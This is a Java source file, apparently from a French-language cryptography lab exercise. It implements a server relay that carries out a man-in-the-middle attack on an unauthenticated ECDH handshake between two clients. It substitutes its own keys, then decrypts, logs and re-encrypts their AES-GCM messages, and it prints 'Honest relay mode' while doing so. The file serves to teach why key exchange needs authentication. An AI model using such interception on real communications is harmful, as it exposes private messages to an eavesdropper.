import java.util.Base64;

import java.nio.charset.StandardCharsets;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;
import java.util.Arrays;
import javax.crypto.*;
import javax.crypto.spec.*;


public class ServerInterceptor {
    public ServerInterceptor() {
        System.out.println("[Server] Honest relay mode");
    }

    public String onMessageRelay(String message, int fromClient, int toClient) {

        // 3.4.2 : Attaque MITM ECDH
        // Tant que les clés AES de session (K1/K2) ne sont pas établies, on est dans la phase handshake.
        if (ENABLE_MITM_ECDH_ATTACK && (!isSessionKeyReady(fromClient) || !isSessionKeyReady(toClient))) {
            return handleMitmHandshake(message, fromClient, toClient);
        }

        // Après le handshake, les messages sont du AES-GCM encodé Base64.
        if (ENABLE_MITM_ECDH_ATTACK && isSessionKeyReady(fromClient) && isSessionKeyReady(toClient)) {

            // 1) Déchiffre avec la clé partagée entre MITM et l'émetteur
            SecretKey keyFrom = getSessionKey(fromClient);
            String clear = decryptAesGcmBase64(keyFrom, message);

            // Si le message n'est pas déchiffrable (format inconnu, tag invalide, etc.), on le relaie tel quel
            if (clear == null) {
                System.out.println("[MITM] Unable to decrypt message from Client " + fromClient + " (relay as-is)");
                return message;
            }

            // 2) Affiche le message en clair (objectif de l'attaque)
            System.out.println("[MITM] CLEARTEXT from Client " + fromClient + ": " + clear);

            // 3) Rechiffre pour le destinataire avec la clé MITM <-> destinataire
            SecretKey keyTo = getSessionKey(toClient);
            String reEncrypted = encryptAesGcmBase64(keyTo, clear);

            System.out.println("Relaying (MITM re-encrypt) from " + fromClient + " to client " + toClient);
            return reEncrypted;
        }

		System.out.println("Relaying from " + fromClient + " to client " + toClient + " : " + message);
        return message;
    }




    // 3.4.2 - MITM ECDH ATTACK

    // Active/désactive l'attaque MITM ECDH (3.4.2)
    private static final boolean ENABLE_MITM_ECDH_ATTACK = true;

    // Paramètres AES-GCM identiques à ceux des clients
    private static final int GCM_IV_LENGTH_BYTES = 12;
    private static final int GCM_TAG_LENGTH_BITS = 128;

    // Aléa crypto pour IV GCM
    private final SecureRandom random = new SecureRandom();

    // Stockage des états pour chaque client (index 1..2)
    private KeyPair mitmKeyPairClient1;
    private KeyPair mitmKeyPairClient2;

    private SecretKey sessionKeyClient1; // clé AES entre MITM et Client 1
    private SecretKey sessionKeyClient2; // clé AES entre MITM et Client 2

    private boolean isSessionKeyReady(int clientId) {
        return (clientId == 1 && sessionKeyClient1 != null)
                || (clientId == 2 && sessionKeyClient2 != null);
    }

    private SecretKey getSessionKey(int clientId) {
        return (clientId == 1) ? sessionKeyClient1 : sessionKeyClient2;
    }

    private KeyPair getOrCreateMitmKeyPair(int clientId) {
        try {
            if (clientId == 1 && mitmKeyPairClient1 != null) return mitmKeyPairClient1;
            if (clientId == 2 && mitmKeyPairClient2 != null) return mitmKeyPairClient2;

            // Génère une paire ECDH côté MITM
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
            // 256 bits -> typiquement secp256r1 (≈ 128 bits de sécurité)
            kpg.initialize(256);
            KeyPair kp = kpg.generateKeyPair();

            if (clientId == 1) mitmKeyPairClient1 = kp;
            else mitmKeyPairClient2 = kp;

            return kp;

        } catch (Exception e) {
            throw new RuntimeException("MITM: failed to create EC keypair", e);
        }
    }

    /**
     Phase handshake MITM :
     - Intercepte la clé publique envoyée par un client
     - Dérive la clé AES de session MITM<->client
     - Envoie au destinataire la clé publique MITM correspondant à SA session
     */
    private String handleMitmHandshake(String message, int fromClient, int toClient) {
        try {
            System.out.println("[MITM] Intercepting ECDH public key from Client " + fromClient);

            // 1) Decode la clé publique du client émetteur
            byte[] clientPubBytes = Base64.getDecoder().decode(message);
            KeyFactory kf = KeyFactory.getInstance("EC");
            PublicKey clientPublicKey = kf.generatePublic(new X509EncodedKeySpec(clientPubBytes));

            // 2) Assure qu'on a une paire MITM pour ce client
            KeyPair mitmKpForFrom = getOrCreateMitmKeyPair(fromClient);

            // 3) Calcule le secret partagé ECDH : privMITM(from) * pubClient(from)
            KeyAgreement ka = KeyAgreement.getInstance("ECDH");
            ka.init(mitmKpForFrom.getPrivate());
            ka.doPhase(clientPublicKey, true);
            byte[] sharedSecret = ka.generateSecret();

            // 4) Dérive une clé AES-128 depuis sharedSecret (SHA-256 puis 16 premiers octets)
            MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
            byte[] hash = sha256.digest(sharedSecret);
            byte[] aesKeyBytes = Arrays.copyOf(hash, 16);
            SecretKey aesKey = new SecretKeySpec(aesKeyBytes, "AES");

            if (fromClient == 1) sessionKeyClient1 = aesKey;
            else sessionKeyClient2 = aesKey;

            System.out.println("[MITM] Session key established with Client " + fromClient);

            // 5) Maintenant on renvoie AU destinataire la clé publique MITM associée à SA session (toClient)
            KeyPair mitmKpForTo = getOrCreateMitmKeyPair(toClient);

            String mitmPubForToB64 = Base64.getEncoder().encodeToString(mitmKpForTo.getPublic().getEncoded());

            System.out.println("[MITM] Sending MITM public key to Client " + toClient + " (pretending it's the peer)");
            return mitmPubForToB64;

        } catch (Exception e) {
            System.out.println("[MITM] Handshake interception failed: " + e.getMessage());
            // Si ça échoue, on relaye tel quel (pour ne pas tout casser)
            return message;
        }
    }

    /**
     * Déchiffre un message AES-GCM encodé Base64 :
     * format = Base64( IV(12) || (ciphertext||tag) )
     * Retourne le clair, ou null si tag invalide / format incorrect.
     */
    private String decryptAesGcmBase64(SecretKey aesKey, String encryptedB64) {
        try {
            byte[] packet = Base64.getDecoder().decode(encryptedB64);

            if (packet.length < GCM_IV_LENGTH_BYTES + 1) {
                return null; // trop court
            }

            byte[] iv = Arrays.copyOfRange(packet, 0, GCM_IV_LENGTH_BYTES);
            byte[] ciphertextAndTag = Arrays.copyOfRange(packet, GCM_IV_LENGTH_BYTES, packet.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, aesKey, new GCMParameterSpec(GCM_TAG_LENGTH_BITS, iv));

            byte[] clearBytes = cipher.doFinal(ciphertextAndTag);
            return new String(clearBytes, StandardCharsets.UTF_8);

        } catch (AEADBadTagException e) {
            // Tag invalide -> message altéré ou mauvaise clé
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Chiffre en AES-GCM + Base64 :
     * Base64( IV(12) || (ciphertext||tag) )
     */
    private String encryptAesGcmBase64(SecretKey aesKey, String plainText) {
        try {
            byte[] iv = new byte[GCM_IV_LENGTH_BYTES];
            random.nextBytes(iv);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, aesKey, new GCMParameterSpec(GCM_TAG_LENGTH_BITS, iv));

            byte[] ciphertextAndTag = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));

            byte[] packet = new byte[iv.length + ciphertextAndTag.length];
            System.arraycopy(iv, 0, packet, 0, iv.length);
            System.arraycopy(ciphertextAndTag, 0, packet, iv.length, ciphertextAndTag.length);

            return Base64.getEncoder().encodeToString(packet);

        } catch (Exception e) {
            throw new RuntimeException("MITM: AES-GCM encryption failed", e);
        }
    }
}